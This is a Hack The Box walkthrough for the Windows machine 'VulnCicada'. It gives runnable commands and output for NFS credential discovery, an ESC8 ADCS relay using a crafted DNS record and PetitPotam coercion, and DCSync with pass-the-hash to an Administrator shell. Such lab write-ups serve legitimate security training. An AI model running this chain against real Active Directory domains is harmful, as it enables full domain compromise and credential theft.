+++
date = '2026-11-11T21:43:18+06:30'
title = 'Vulncicada ECS8'
cover = '/images/covers/7.jpeg'
+++

# HTB: VulnCicada

**Platform:** Hack The Box  
**OS:** Windows  
**Difficulty:** Medium  
**Domain:** `cicada.vl`  
**Domain Controller:** `DC-JPQ225.cicada.vl`

## Overview

VulnCicada is a Windows Active Directory machine involving NFS enumeration, credential discovery, ADCS enumeration, and ESC8 exploitation.

The attack path:

1. Enumerate exposed NFS shares.
2. Extract images and discover credentials for Rosie.Powell.
3. Authenticate to SMB using Kerberos.
4. Enumerate Active Directory Certificate Services (ADCS).
5. Exploit ESC8 through Kerberos authentication coercion and certificate relay.
6. Obtain a TGT as the Domain Controller machine account.
7. Perform DCSync to dump the Administrator NTLM hash.
8. Authenticate as Administrator and obtain a shell.

---

# 1. Reconnaissance

## 1.1 Port Scanning

First, perform a full TCP port scan.

```bash
nmap -p- -vvv --min-rate 10000 10.129.234.48
```

Perform service and version detection on discovered ports.

```bash
nmap -p 53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5357,5985,9389 -sCV 10.129.234.48
```

Important discovered services:

| Port | Service | Description |
|---|---|---|
| 53 | DNS | Domain Name System |
| 80 | HTTP | IIS Web Server |
| 88 | Kerberos | Domain authentication |
| 111 | RPCBind | RPC services |
| 389 | LDAP | Active Directory |
| 445 | SMB | File sharing |
| 636 | LDAPS | Secure LDAP |
| 2049 | NFS | Network File System |
| 3268 | Global Catalog | AD Global Catalog |
| 3269 | Global Catalog SSL | Secure Global Catalog |
| 3389 | RDP | Remote Desktop |
| 5985 | WinRM | Windows Remote Management |
| 9389 | ADWS | Active Directory Web Services |

Identified domain information:

```text
Domain: cicada.vl
Hostname: DC-JPQ225
DC: DC-JPQ225.cicada.vl
```

## 1.2 Generate Hosts File

Use NetExec to identify the hostname and generate a hosts file.

```bash
netexec smb 10.129.234.48 --generate-hosts-file hosts
```

Example output:

```text
10.129.234.48 DC-JPQ225.cicada.vl cicada.vl DC-JPQ225
```

Add the generated entry to `/etc/hosts`.

```bash
cat hosts /etc/hosts | sponge /etc/hosts
```

## 1.3 HTTP Enumeration

The web server runs Microsoft IIS 10.0.

```bash
curl -I http://10.129.234.48
```

Directory enumeration:

```bash
feroxbuster -u http://10.129.234.48 \
-w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

Only the default IIS page and static resources were discovered. Nothing interesting here.

## 1.4 SMB Enumeration

Check whether anonymous or guest authentication is available.

```bash
netexec smb DC-JPQ225.cicada.vl -u guest -p ''
```

The server reports:

```text
STATUS_NOT_SUPPORTED
```

Try Kerberos authentication with a guest account.

```bash
netexec smb DC-JPQ225.cicada.vl -u guest -p '' -k
```

Try a nonexistent user.

```bash
netexec smb DC-JPQ225.cicada.vl -u oxdf -p '' -k
```

Results:

- `KDC_ERR_CLIENT_REVOKED`: The account is revoked or disabled.
- `KDC_ERR_C_PRINCIPAL_UNKNOWN`: The requested Kerberos principal does not exist.

NTLM authentication is disabled, so Kerberos will be important throughout this machine.

---

# 2. NFS Enumeration

## 2.1 Discover NFS Shares

Port 2049 is open, so enumerate available NFS exports.

```bash
showmount -e 10.129.234.48
```

Output:

```text
Export list for 10.129.234.48:
/profiles (everyone)
```

The `/profiles` share is accessible to everyone.

## 2.2 Mount NFS Share

Mount the share locally.

```bash
sudo mount -t nfs -o rw 10.129.234.48:/profiles /mnt
```

List directories.

```bash
ls /mnt
```

Output:

```text
Administrator
Daniel.Marshall
Debra.Wright
Jane.Carter
Jordan.Francis
Joyce.Andrews
Katie.Ward
Megan.Simpson
Richard.Gibbons
Rosie.Powell
Shirley.West
```

The directories appear to correspond to Windows user profiles.

Find accessible files:

```bash
find /mnt -ls
```

Find files:

```bash
find /mnt -type f -ls
```

Two interesting images are discovered:

```text
/mnt/Administrator/vacation.png
/mnt/Rosie.Powell/marketing.png
```

## 2.3 Extract Images

Copy the Administrator image:

```bash
cp /mnt/Administrator/vacation.png .
```

Copy Rosie's image using sudo because of its file permissions:

```bash
sudo cp /mnt/Rosie.Powell/marketing.png .
```

Inspect both images.

```bash
file vacation.png marketing.png
```

The `marketing.png` image contains a sticky note with a password.

Discovered credentials:

```text
Username: Rosie.Powell
Password: Cicada123
```

---

# 3. Authentication as Rosie.Powell

## 3.1 Verify Credentials

Test the credentials using Kerberos.

```bash
netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
```

Successful authentication:

```text
[+] cicada.vl\Rosie.Powell:Cicada123
```

## 3.2 Enumerate SMB Shares

List available SMB shares.

```bash
netexec smb DC-JPQ225.cicada.vl \
-u Rosie.Powell -p Cicada123 -k --shares
```

Discovered shares:

```text
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
profiles$
SYSVOL
```

Interesting shares:

- `CertEnroll`: Related to Active Directory Certificate Services.
- `profiles$`: Same profile storage exposed through NFS.
- `SYSVOL`: Contains domain policy and logon scripts.

`CertEnroll` is particularly interesting because it indicates that ADCS is deployed.

## 3.3 Generate Kerberos TGT

Generate a Kerberos Ticket Granting Ticket (TGT).

```bash
netexec smb DC-JPQ225.cicada.vl \
-u Rosie.Powell -p Cicada123 -k --generate-tgt Rosie.Powell
```

The ticket is saved as:

```text
Rosie.Powell.ccache
```

Set the Kerberos credential cache:

```bash
export KRB5CCNAME=Rosie.Powell.ccache
```

## 3.4 Connect to SMB Using Kerberos

Use Impacket's SMB client.

```bash
smbclient.py -k DC-JPQ225.cicada.vl
```

List shares:

```text
# shares
```

Connect to the certificate enrollment share:

```text
# use CertEnroll
# ls
```

The directory contains many `.crt` and `.crl` files.

These are public certificates and Certificate Revocation Lists. Their presence confirms ADCS activity, but they do not directly provide private keys or credentials.

---

# 4. ADCS Enumeration

## 4.1 Enumerate Certificate Authorities

Use Certipy to enumerate certificate authorities and vulnerable templates.

```bash
certipy find \
-target DC-JPQ225.cicada.vl \
-u Rosie.Powell@cicada.vl \
-p Cicada123 \
-k \
-vulnerable \
-stdout
```

Important findings:

```text
CA Name: cicada-DC-JPQ225-CA
DNS Name: DC-JPQ225.cicada.vl

Web Enrollment:
    HTTP: Enabled
    HTTPS: Disabled

User Specified SAN: Disabled

Enroll:
    CICADA.VL\Authenticated Users

Vulnerabilities:
    ESC8: Web Enrollment is enabled over HTTP.
```

The CA has HTTP Web Enrollment enabled.

**ESC8 is an NTLM relay vulnerability involving ADCS Web Enrollment.**

Even though no vulnerable certificate templates were returned, the CA itself is vulnerable to ESC8.

---

# 5. ESC8 Exploitation

## 5.1 Understanding ESC8

ESC8 is an Active Directory Certificate Services attack that abuses NTLM authentication relay.

The general attack flow:

1. Start an NTLM relay listener.
2. Coerce a privileged machine account to authenticate to the attacker.
3. Relay the authentication to the ADCS HTTP Web Enrollment endpoint.
4. Request a certificate using an appropriate template.
5. Retrieve the issued certificate and private key.
6. Authenticate as the impersonated machine account using the certificate.

In this machine, the target is the Domain Controller machine account:

```text
DC-JPQ225$
```

The certificate template used is:

```text
DomainController
```

## 5.2 Check MachineAccountQuota

Before choosing the Linux exploitation approach, check whether ordinary domain users can create computer accounts.

```bash
netexec ldap DC-JPQ225.cicada.vl \
-u Rosie.Powell -p Cicada123 -k -M maq
```

Output:

```text
MachineAccountQuota: 10
```

This means a domain user can create up to 10 computer accounts under the default quota.

There are two possible exploitation approaches:

- Join a Windows VM to the domain and use RemoteKrbRelay.
- Perform the attack from Linux using a malicious DNS record, PetitPotam, and Certipy relay.

This writeup uses the Linux approach.

## 5.3 Create Malicious DNS Record

The Linux attack uses a specially crafted DNS record containing a serialized empty `CREDENTIAL_TARGET_INFORMATION` structure.

The record name:

```text
DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

This technique tricks the DC into requesting Kerberos authentication for a name that resolves to the attacker's IP address.

Add the malicious DNS record using bloodyAD:

```bash
bloodyAD \
-u Rosie.Powell \
-p Cicada123 \
-d cicada.vl \
-k \
--host DC-JPQ225.cicada.vl \
add dnsRecord \
DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA \
10.10.14.79
```

Replace `10.10.14.79` with your actual VPN IP address.

## 5.4 Start Certipy Relay

Start Certipy's relay listener and target the ADCS Web Enrollment endpoint.

```bash
certipy relay \
-target 'http://dc-jpq225.cicada.vl/' \
-template DomainController
```

Expected output:

```text
[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

Keep this terminal running.

The relay listener waits for the Domain Controller to authenticate.

## 5.5 Enumerate Authentication Coercion Methods

Use NetExec's `coerce_plus` module to identify available coercion methods.

```bash
netexec smb DC-JPQ225.cicada.vl \
-u Rosie.Powell \
-p Cicada123 \
-k \
-M coerce_plus
```

The machine reports several vulnerable methods:

```text
VULNERABLE, DFSCoerce
VULNERABLE, PetitPotam
VULNERABLE, PrinterBug
```

PetitPotam is used for this attack.

## 5.6 Trigger PetitPotam

Trigger authentication coercion using the malicious DNS record as the listener.

```bash
netexec smb DC-JPQ225.cicada.vl \
-u Rosie.Powell \
-p Cicada123 \
-k \
-M coerce_plus \
-o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

Expected output:

```text
VULNERABLE, PetitPotam
Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

The Domain Controller is now coerced into authenticating to the attacker.

## 5.7 Capture and Relay Authentication

Return to the terminal running Certipy relay.

Successful relay output:

```text
[*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] Certificate issued with request ID 95
[*] Retrieving certificate for request ID: 95
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
```

The certificate and private key are saved as:

```text
dc-jpq225.pfx
```

This certificate represents the Domain Controller machine account.

---

# 6. Authenticate as the Domain Controller

## 6.1 Request TGT Using Certificate

Use Certipy to authenticate with the obtained PFX certificate.

```bash
certipy auth \
-pfx dc-jpq225.pfx \
-dc-ip 10.129.234.48
```

Successful output:

```text
[*] Certificate identities:
[*] SAN DNS Host Name: 'DC-JPQ225.cicada.vl'

[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Got hash for 'dc-jpq225$@cicada.vl':
a65952c664e9cf5de60195626edbeee3
```

Two important results:

- Kerberos TGT for `DC-JPQ225$`.
- NTLM hash of the machine account.

Set the new Kerberos credential cache:

```bash
export KRB5CCNAME=dc-jpq225.ccache
```

---

# 7. DCSync - Dump Administrator Hash

The Domain Controller machine account has the required privileges to perform DCSync.

DCSync abuses Active Directory replication permissions to retrieve password hashes from the domain controller without directly accessing the NTDS database file.

Use Impacket's `secretsdump.py` to retrieve the Administrator hash.

```bash
secretsdump.py \
-k \
-no-pass \
cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl \
-just-dc-user administrator
```

Important output:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
```

Extract the Administrator NTLM hash:

```text
85a0da53871a9d56b6cd05deda3a5e87
```

---

# 8. Shell as Administrator

## 8.1 Verify Administrator Hash

Use NetExec to verify the hash through Kerberos authentication.

```bash
netexec smb dc-jpq225.cicada.vl \
-u administrator \
-H 85a0da53871a9d56b6cd05deda3a5e87 \
-k
```

Successful authentication:

```text
[+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
```

## 8.2 Obtain Shell Using wmiexec

Use Impacket's `wmiexec.py` to obtain a semi-interactive shell.

```bash
wmiexec.py \
cicada.vl/administrator@dc-jpq225.cicada.vl \
-k \
-hashes :85a0da53871a9d56b6cd05deda3a5e87
```

Verify the current user:

```cmd
whoami
```

Output:

```text
cicada\administrator
```

Administrator access successfully obtained.

## 8.3 Retrieve Flags

User flag:

```cmd
cd C:\Users\Administrator\Desktop
type user.txt
```

Root flag:

```cmd
type root.txt
```

---

# 9. Important Concepts & Notes

## NFS Enumeration

NFS (Network File System) allows remote systems to access shared directories.

Useful commands:

```bash
showmount -e TARGET
sudo mount -t nfs TARGET:/profiles /mnt
find /mnt -type f -ls
```

Always check accessible user profiles for interesting files, configuration files, backups, and credentials.

## Kerberos Authentication

Kerberos is an authentication protocol used by Active Directory.

Important concepts:

- TGT: Ticket Granting Ticket.
- TGS: Ticket Granting Service ticket.
- CCache: Local Kerberos credential cache.
- Machine account: Computer account in Active Directory, usually ending with `$`.

Useful commands:

```bash
export KRB5CCNAME=user.ccache
klist
```

## ADCS

Active Directory Certificate Services allows an organization to issue and manage certificates.

Useful enumeration command:

```bash
certipy find -target $domain -u USER@DOMAIN -p PASSWORD -k -dc-ip DC_IP -vulnerable -stdout
```


## ESC8

ESC8 abuses NTLM authentication relay against HTTP-based ADCS Web Enrollment.

Attack components:

| Tool | Purpose |
|---|---|
| Certipy | ADCS enumeration and certificate relay |
| bloodyAD | Active Directory DNS record manipulation |
| NetExec | SMB enumeration and authentication coercion |
| PetitPotam | Coerce authentication from the DC |
| secretsdump | DCSync and credential extraction |
| wmiexec | Remote shell |

```bash
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.65
```

```bash 
certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
```

```bash
-> On Local Machine
-> pip install 'pyOpenSSL==24.3.0'
impacket-ntlmrelayx -t http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
```

```bash
-> Choosing PetitPotam
netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus 

nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

## DCSync

```bash
-> Getting pfx from relax
certipy auth -pfx [from_relay].pfx -dc-ip 10.129.234.48

-> NTLM authentication disabled so need to use KRB5cCNAME ccache
KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dc-
jpq225.cicada.vl -just-dc-user administrator
```

---

# 10. Attack Chain Summary

```text
Nmap Enumeration
       |
       v
NFS Share Discovery
       |
       v
Extract marketing.png
       |
       v
Discover Rosie.Powell Credentials
       |
       v
Kerberos Authentication
       |
       v
SMB + ADCS Enumeration
       |
       v
ESC8 Identified
       |
       v
Create Malicious DNS Record
       |
       v
Start Certipy Relay
       |
       v
PetitPotam Authentication Coercion
       |
       v
Certificate Issued for DC-JPQ225$
       |
       v
Certipy Authentication
       |
       v
Machine Account TGT
       |
       v
DCSync - Administrator NTLM Hash
       |
       v
Pass-the-Hash
       |
       v
WMIEXEC
       |
       v
Administrator Shell
```

## 11. Key Takeaways

- NFS shares can expose sensitive files even when SMB anonymous authentication is disabled.
- Image files can contain credentials through visual information such as sticky notes.
- Kerberos authentication is important when NTLM is disabled.
- `CertEnroll` is a useful indicator that ADCS may be deployed.
- ESC8 allows authentication relay against HTTP-based certificate enrollment.
- PetitPotam can coerce a Domain Controller to authenticate to an attacker-controlled host.
- A Domain Controller machine certificate can provide authentication as the machine account.
- DCSync can retrieve domain password hashes when the account has sufficient replication privileges.
- Administrator NTLM hashes can be used for Pass-the-Hash authentication.

**Root cause:** Exposed NFS user profiles disclosed credentials, and insecure ADCS HTTP Web Enrollment allowed ESC8 certificate relay, leading to full domain compromise.